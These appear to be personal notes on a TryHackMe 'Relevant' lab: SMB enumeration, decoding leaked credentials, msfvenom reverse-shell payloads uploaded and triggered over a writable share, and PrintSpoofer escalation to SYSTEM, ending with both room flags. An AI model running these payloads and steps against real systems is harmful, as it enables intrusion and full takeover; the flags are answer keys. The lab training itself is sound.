Description

2024年3月21日 木曜日

8:03

https://ahoner.medium.com/tryhackme-relevant-walkthrough-4eacbabdf8a5

R6.3.20

ServiceEnumelation

root@ip-10-10-199-201:~# nmap -T4 10.10.243.84

Starting Nmap 7.60 ( https://nmap.org ) at 2024-03-20 00:52 GMT

Nmap scan report for ip-10-10-243-84.eu-west-1.compute.internal (10.10.243.84)

Host is up (0.034s latency).

Not shown: 995 filtered ports

PORT     STATE SERVICE

80/tcp   open  http

135/tcp  open  msrpc

139/tcp  open  netbios-ssn

445/tcp  open  microsoft-ds

3389/tcp open  ms-wbt-server

MAC Address: 02:D1:31:1B:BE:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 16.07 seconds

![[Relevant image.png]]

root@ip-10-10-199-201:~# smbclient //10.10.243.84/

WARNING: The "syslog" option is deprecated

root@ip-10-10-199-201:~# smbclient //10.10.243.84/c

WARNING: The "syslog" option is deprecated

Enter WORKGROUP\root's password:

tree connect failed: NT_STATUS_BAD_NETWORK_NAME

root@ip-10-10-199-201:~# smbclient //10.10.243.84/admin

WARNING: The "syslog" option is deprecated

Enter WORKGROUP\root's password:

tree connect failed: NT_STATUS_BAD_NETWORK_NAME

root@ip-10-10-199-201:~# smbclient //10.10.243.84/nt4wrksv

WARNING: The "syslog" option is deprecated

Enter WORKGROUP\root's password:

Try "help" to get a list of possible commands.

smb: \> ls

.                                   D        0  Sat Jul 25 22:46:04 2020

..                                  D        0  Sat Jul 25 22:46:04 2020

passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

7735807 blocks of size 4096. 4946847 blocks available

smb: \> cat passward.txt

cat: command not found

smb: \> get password.txt

NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \password.txt

smb: \> pwd

Current directory is \\10.10.243.84\nt4wrksv\

smb: \> id

id: command not found

![[Relevant image 1.png]]

root@ip-10-10-199-201:~# smbclient //10.10.243.84/IPC$ -U Bob

WARNING: The "syslog" option is deprecated

Enter WORKGROUP\Bob's password:

Try "help" to get a list of possible commands.

smb: \>

![[Relevant image 2.png]]

R6.3.21

└─# cat passwords.txt

\[User Passwords - Encoded\]

Qm9iIC0gIVBAJCRXMHJEITEyMw==

QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

![[Relevant image 3.png]]

Bob - !P@$$W0rD!123

Bill - Juw4nnaM4n420696969!$$$

![[Relevant image 4.png]]

==🔴msfvenom -p windows/x64/shell_reverse_tcp LHOST=====🔴10.1====🔴8.31.142== ==🔴LPORT=====🔴1234== ==🔴-f exe >shell-x64.exe==

Initial Access

TargetIP:10.10.196.224

nmap -p 80,135,139,445,3389,49663,49667,49669 10.10.196.224 -sV -sC

root@ip-10-10-151-85:~# nmap -p 80,135,139,445,3389,49663,49667,49669 10.10.196.224 -sV -sC

Starting Nmap 7.60 ( https://nmap.org ) at 2024-03-21 15:56 GMT

Nmap scan report for ip-10-10-196-224.eu-west-1.compute.internal (10.10.196.224)

Host is up (0.029s latency).

PORT      STATE SERVICE       VERSION

80/tcp    open  http          Microsoft IIS httpd 10.0

\| http-methods:

\|_  Potentially risky methods: TRACE

\|_http-server-header: Microsoft-IIS/10.0

\|_http-title: IIS Windows Server

135/tcp   open  msrpc         Microsoft Windows RPC

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds

3389/tcp  open  ms-wbt-server Microsoft Terminal Services

\| ssl-cert: Subject: commonName=Relevant

\| Not valid before: 2024-03-20T15:47:21

\|_Not valid after:  2024-09-19T15:47:21

\|_ssl-date: 2024-03-21T15:57:24+00:00; +1s from scanner time.

49663/tcp open  http          Microsoft IIS httpd 10.0

\| http-methods:

\|_  Potentially risky methods: TRACE

\|_http-server-header: Microsoft-IIS/10.0

\|_http-title: IIS Windows Server

49667/tcp open  msrpc         Microsoft Windows RPC

49669/tcp open  msrpc         Microsoft Windows RPC

MAC Address: 02:3E:4F:65:48:53 (Unknown)

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:

\|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: \<unknown>, NetBIOS MAC: 02:3e:4f:65:48:53 (unknown)

\| smb-os-discovery:

\|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)

\|   Computer name: Relevant

\|   NetBIOS computer name: RELEVANT\x00

\|   Workgroup: WORKGROUP\x00

\|_  System time: 2024-03-21T08:57:24-07:00

\| smb-security-mode:

\|   account_used: guest

\|   authentication_level: user

\|   challenge_response: supported

\|_  message_signing: disabled (dangerous, but default)

\| smb2-security-mode:

\|   2.02:

\|_    Message signing enabled but not required

\| smb2-time:

\|   date: 2024-03-21 15:57:24

\|_  start_date: 2024-03-21 15:48:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 95.04 seconds

![[Relevant image 7.png]]

root@ip-10-10-151-85:~# smbclient -L 10.10.196.224

WARNING: The "syslog" option is deprecated

Enter WORKGROUP\root's password:

Sharename       Type      Comment

---------       ----      -------

ADMIN$          Disk      Remote Admin

C$              Disk      Default share

IPC$            IPC       Remote IPC

nt4wrksv        Disk

Reconnecting with SMB1 for workgroup listing.

Connection to 10.10.196.224 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

Failed to connect with SMB1 -- no workgroup available

![[Relevant image 8.png]]

root@ip-10-10-151-85:~# smbclient \\\\10.10.196.224\\nt4wrksv

WARNING: The "syslog" option is deprecated

Enter WORKGROUP\root's password:

Try "help" to get a list of possible commands.

smb: \>

![[Relevant image 9.png]]

smb: \> ls

.                                   D        0  Sat Jul 25 22:46:04 2020

..                                  D        0  Sat Jul 25 22:46:04 2020

passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

7735807 blocks of size 4096. 4946658 blocks available

smb: \> get passwords.txt

getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

![[Relevant image 10.png]]

root@ip-10-10-151-85:~# cat passwords.txt

\[User Passwords - Encoded\]

Qm9iIC0gIVBAJCRXMHJEITEyMw==

QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQkroot@ip-10-10-151-85:~#

root@ip-10-10-151-85:~# echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d

Bob - !P@$$W0rD!123root@ip-10-10-151-85:~#

root@ip-10-10-151-85:~# echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d

Bill - Juw4nnaM4n420696969!$$$root@ip-10-10-151-85:~

![[Relevant image 11.png]]

gobuster dir -u http/10.10.196.224:49663 -w directory-list-2.3-medium.txt -s ‘200,301’ — no-error -t 50

root@ip-10-10-151-85:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.151.85 LPORT=443 -f aspx > reverse.aspx

\[-\] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

\[-\] No arch selected, selecting arch: x64 from the payload

No encoder specified, outputting raw payload

Payload size: 460 bytes

Final size of aspx file: 3438 bytes

![[Relevant image 12.png]]

root@ip-10-10-151-85:~# smbclient \\\\10.10.196.224\\nt4wrksv

WARNING: The "syslog" option is deprecated

Enter WORKGROUP\root's password:

Try "help" to get a list of possible commands.

smb: \> put reverse.aspx

putting file reverse.aspx as \reverse.aspx (20.0 kb/s) (average 20.0 kb/s)

smb: \> ls

.                                   D        0  Thu Mar 21 16:33:13 2024

..                                  D        0  Thu Mar 21 16:33:13 2024

passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

reverse.aspx                        A     3438  Thu Mar 21 16:33:13 2024

7735807 blocks of size 4096. 4936756 blocks available

![[Relevant image 13.png]]

root@ip-10-10-151-85:~# curl http://10.10.196.224:49663/nt4wrksv/reverse.aspx

![[Relevant image 14.png]]

root@ip-10-10-151-85:~# nc -lvp 443

Listening on \[0.0.0.0\] (family 0, port 443)

Connection from ip-10-10-196-224.eu-west-1.compute.internal 49875 received!

Microsoft Windows \[Version 10.0.14393\]

(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

![[Relevant image 5.png]]

c:\>cd users\bob\desktop

cd users\bob\desktop

c:\Users\Bob\Desktop>dir

dir

Volume in drive C has no label.

Volume Serial Number is AC3C-5CB5

Directory of c:\Users\Bob\Desktop

07/25/2020  02:04 PM    \<DIR>          .

07/25/2020  02:04 PM    \<DIR>          ..

07/25/2020  08:24 AM                35 user.txt

1 File(s)             35 bytes

2 Dir(s)  21,072,646,144 bytes free

c:\Users\Bob\Desktop>type user.txt

type user.txt

THM{fdk4ka34vk346ksxfr21tg789ktf45}

![[Relevant image 6.png]]

Privilege　Escalation

c:\windows\system32\inetsrv>whoami /priv

whoami /priv

PRIVILEGES INFORMATION

\----------------------

Privilege Name                Description                               State

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled

SeAuditPrivilege              Generate security audits                  Disabled

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege       Create global objects                     Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

![[Relevant image 15.png]]

c:\windows\system32\inetsrv>whoami

whoami

iis apppool\defaultapppool

![[Relevant image 16.png]]

printspoofer

https://github.com/dievus/printspoofer

smb: \> put PrintSpoofer.exe

putting file PrintSpoofer.exe as \PrintSpoofer.exe (13.8 kb/s) (average 13.8 kb/s)

![[Relevant image 17.png]]

nc.exe

https://www.google.com/gasearch?q=nc.exe&tbm=&source=sh/x/gs/m2/5

smb: \> put nc64.exe

putting file nc64.exe as \nc64.exe (24.2 kb/s) (average 15.3 kb/s)

![[Relevant image 18.png]]

smb: \> ls

.                                   D        0  Sat Mar 23 22:11:40 2024

..                                  D        0  Sat Mar 23 22:11:40 2024

nc64.exe                            A    45272  Sat Mar 23 22:06:27 2024

passwords.txt                       A       98  Sun Jul 26 00:15:33 2020

PrintSpoofer.exe                    A   145235  Sat Mar 23 22:00:41 2024

reverse.aspx                        A  1020174  Sat Mar 23 22:11:50 2024

7735807 blocks of size 4096. 4945314 blocks available

![[Relevant image 19.png]]

2024/04/07

└─# wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

![[Relevant image 20.png]]

smb: \> put PrintSpoofer64.exe

putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (6.8 kb/s) (average 68.5 kb/s)

![[Relevant image 21.png]]

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell.exe

PrintSpoofer64.exe -i -c powershell.exe

\[+\] Found privilege: SeImpersonatePrivilege

\[+\] Named pipe listening...

\[+\] CreateProcessAsUser() OK

sWindows PowerShell

Copyright (C) 2016 Microsoft Corporation. All rights reserved.

![[Relevant image 22.png]]

meterpreter > shell

Process 3248 created.

Channel 3 created.

Microsoft Windows \[Version 10.0.14393\]

(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami

whoami

nt authority\system

c:\windows\system32\inetsrv>cd \users\administrator\desktop

cd \users\administrator\desktop

c:\Users\Administrator\Desktop>dir

dir

Volume in drive C has no label.

Volume Serial Number is AC3C-5CB5

Directory of c:\Users\Administrator\Desktop

07/25/2020  08:24 AM    \<DIR>          .

07/25/2020  08:24 AM    \<DIR>          ..

07/25/2020  08:25 AM                35 root.txt

1 File(s)             35 bytes

2 Dir(s)  20,260,331,520 bytes free

c:\Users\Administrator\Desktop>type root.txt

type root.txt

THM{1fk5kf469devly1gl320zafgl345pv}

c:\Users\Administrator\Desktop>

![[Relevant image 23.png]]